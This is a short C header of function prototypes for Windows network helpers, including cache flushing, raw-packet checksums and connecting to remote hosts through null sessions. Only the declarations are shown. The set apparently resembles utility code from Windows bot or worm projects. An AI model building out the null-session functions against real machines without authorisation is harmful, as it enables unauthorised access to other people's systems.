bool PrivateIP(const char *ip);
unsigned long ResolveAddress(char *szHost);
bool FlushARPCache(void);
bool FlushDNSCache(void);
char *GetIP(SOCKET sock);
USHORT checksum(USHORT *buffer, int size);
bool ConnectViaNullSession(const char *remote_host, LPNETRESOURCEW nr);
bool CloseNullSession(const char *remote_host);

